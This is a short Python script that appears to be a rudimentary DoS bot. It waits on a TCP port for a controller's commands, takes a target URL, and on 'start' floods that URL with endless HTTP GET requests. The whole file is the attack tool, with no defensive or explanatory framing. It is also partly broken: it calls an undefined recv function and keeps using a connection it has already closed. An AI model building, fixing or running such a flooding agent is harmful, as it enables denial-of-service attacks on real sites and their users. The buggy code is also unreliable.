import socket, os, requests, sys

ip = '10.9.1.23'
port = 6663

def doz(url):
	try:
		while True:
			r = requests.get(url)

	except:
		pass


def c_listen():
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	con, adr = s.accept()
	print(adr,' is connected!')
	url = ''

	while True:
		cmd = con.recv(1024).decode()
		if cmd == 'gg':
			con.send(f'connection closed from {ip}'.encode())
			con.close()
			break
		elif cmd == 'target':
			con.send('tar'.encode())
			if recv(1024):
				con.send('target loaded'.encode())
				url = con.recv(1024).decode()
				print(url)
				con.close()
		elif cmd == 'start':
			doz(url)
			
		else:
			con.send('command not found!'.encode())

	


c_listen()
